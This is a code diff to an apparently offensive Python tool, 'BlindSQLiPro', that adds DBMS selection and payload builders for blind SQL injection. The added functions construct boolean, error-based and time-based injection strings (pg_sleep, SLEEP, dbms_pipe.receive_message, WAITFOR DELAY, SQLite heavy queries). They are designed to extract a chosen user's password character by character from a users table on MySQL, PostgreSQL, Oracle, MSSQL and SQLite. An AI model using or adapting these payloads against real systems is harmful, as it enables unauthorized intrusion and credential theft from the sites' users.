@@ -25,28 +25,26 @@ DEFAULT_HEADERS = {
     "Upgrade-Insecure-Requests": "1",
 }
 
+DBMS_CHOICES = ["auto", "mysql", "postgres", "oracle", "mssql", "sqlite"]
+
 
 def setup_logger(log_file, name="BlindSQLiPro"):
     logger = logging.getLogger(name)
     logger.setLevel(logging.DEBUG)
-
     for h in list(logger.handlers):
         logger.removeHandler(h)
-
     fh = logging.FileHandler(log_file, mode='w', encoding='utf-8')
     fh.setLevel(logging.DEBUG)
     fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-
     ch = logging.StreamHandler(sys.stdout)
     ch.setLevel(logging.INFO)
     ch.setFormatter(logging.Formatter('%(message)s'))
-
     logger.addHandler(fh)
     logger.addHandler(ch)
     return logger
 
 
-def banner(title="B L I N D   S Q L I   B R U T E   T O O L", subtitle="", version="2.0"):
+def banner(title="B L I N D   S Q L I   B R U T E   T O O L", subtitle="", version="2.1"):
     print(f"""
 {Fore.CYAN}
     ====================================================================
@@ -176,3 +174,139 @@ def prompt_timeout(default=15):
         except ValueError:
             pass
     return default
+
+
+def prompt_dbms():
+    print(f"{Fore.CYAN}Select target DBMS: {Style.RESET_ALL}")
+    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} Auto-detect (recommended)")
+    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} MySQL")
+    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} PostgreSQL")
+    print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL} Oracle")
+    print(f"  {Fore.YELLOW}[5]{Style.RESET_ALL} MSSQL")
+    print(f"  {Fore.YELLOW}[6]{Style.RESET_ALL} SQLite")
+    mapping = {"1": "auto", "2": "mysql", "3": "postgres", "4": "oracle", "5": "mssql", "6": "sqlite"}
+    while True:
+        v = input(f"{Fore.CYAN}Enter choice [Default: 1]: {Style.RESET_ALL}").strip() or "1"
+        if v in mapping:
+            return mapping[v]
+        log_error("Invalid choice. Enter 1-6.")
+
+
+def prompt_time_delay(default=10):
+    v = input(f"{Fore.CYAN}Enter time delay in seconds for pg_sleep/SLEEP [Default: {default}]: {Style.RESET_ALL}").strip()
+    if v:
+        try:
+            return max(1, int(v))
+        except ValueError:
+            pass
+    return default
+
+
+def prompt_time_threshold(default=7):
+    v = input(f"{Fore.CYAN}Enter detection threshold in seconds (elapsed >= threshold = TRUE) [Default: {default}]: {Style.RESET_ALL}").strip()
+    if v:
+        try:
+            return max(1, int(v))
+        except ValueError:
+            pass
+    return default
+
+
+def _substr(dbms, col, pos, length=1):
+    if dbms == "mssql":
+        return f"SUBSTRING({col},{pos},{length})"
+    return f"SUBSTR({col},{pos},{length})"
+
+
+def _length_fn(dbms, col):
+    if dbms == "mssql":
+        return f"LEN({col})"
+    return f"LENGTH({col})"
+
+
+def build_boolean_payload(dbms, base_id, user, position, char):
+    sub = _substr(dbms, "password", position)
+    return f"{base_id}' and (select {sub} from users where username='{user}')='{char}'--"
+
+
+def build_boolean_probe(dbms, base_id, user):
+    return f"{base_id}' and (select username from users where username='{user}')='{user}'--"
+
+
+def build_error_payload(dbms, base_id, user, position, char):
+    sub = _substr(dbms, "password", position)
+    if dbms == "oracle":
+        return (
+            f"{base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END "
+            f"from users where username='{user}' and {sub}='{char}') || '"
+        )
+    elif dbms == "mssql":
+        return (
+            f"{base_id}' || (select CASE WHEN ({sub}='{char}') THEN 1/0 ELSE '' END "
+            f"from users where username='{user}') || '"
+        )
+    elif dbms == "mysql":
+        return (
+            f"{base_id}' and (select 1 from (select count(*),concat((select {sub} "
+            f"from users where username='{user}'),floor(rand(0)*2))x from information_schema.tables group by x)a)--"
+        )
+    else:
+        return f"{base_id}' and (select 1/0 from users where username='{user}' and {sub}='{char}')--"
+
+
+def build_error_probe(dbms, base_id):
+    if dbms == "oracle":
+        return f"{base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"
+    elif dbms == "mssql":
+        return f"{base_id}' || (select CASE WHEN (1=1) THEN 1/0 ELSE '' END) || '"
+    elif dbms == "mysql":
+        return f"{base_id}' and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--"
+    else:
+        return f"{base_id}' and 1/0--"
+
+
+def build_time_payload(dbms, base_id, user, position, char, delay):
+    sub = _substr(dbms, "password", position)
+    if dbms == "postgres":
+        return (
+            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
+            f"then pg_sleep({delay}) else pg_sleep(0) end from users)--"
+        )
+    elif dbms == "mysql":
+        return (
+            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
+            f"then sleep({delay}) else sleep(0) end from users)--"
+        )
+    elif dbms == "oracle":
+        return (
+            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
+            f"then dbms_pipe.receive_message(('a'),{delay}) else null end from users) || '"
+        )
+    elif dbms == "mssql":
+        return (
+            f"{base_id}'; if (select count(*) from users where username='{user}' and {sub}='{char}')>0 "
+            f"waitfor delay '0:0:{delay}'--"
+        )
+    elif dbms == "sqlite":
+        return (
+            f"{base_id}' and (select case when (username='{user}' and {sub}='{char}') "
+            f"then (select count(*) from sqlite_master a, sqlite_master b, sqlite_master c) else 0 end from users)--"
+        )
+    return ""
+
+
+def build_time_probe(dbms, base_id, delay):
+    if dbms == "postgres":
+        return f"{base_id}' || pg_sleep({delay})--"
+    elif dbms == "mysql":
+        return f"{base_id}' || sleep({delay})--"
+    elif dbms == "oracle":
+        return f"{base_id}' || dbms_pipe.receive_message(('a'),{delay}) || '"
+    elif dbms == "mssql":
+        return f"{base_id}'; waitfor delay '0:0:{delay}'--"
+    elif dbms == "sqlite":
+        return f"{base_id}' and 1=(select count(*) from sqlite_master a, sqlite_master b, sqlite_master c)--"
+    return ""
+
+
+AUTO_DETECT_ORDER = ["postgres", "mysql", "oracle", "mssql", "sqlite"]
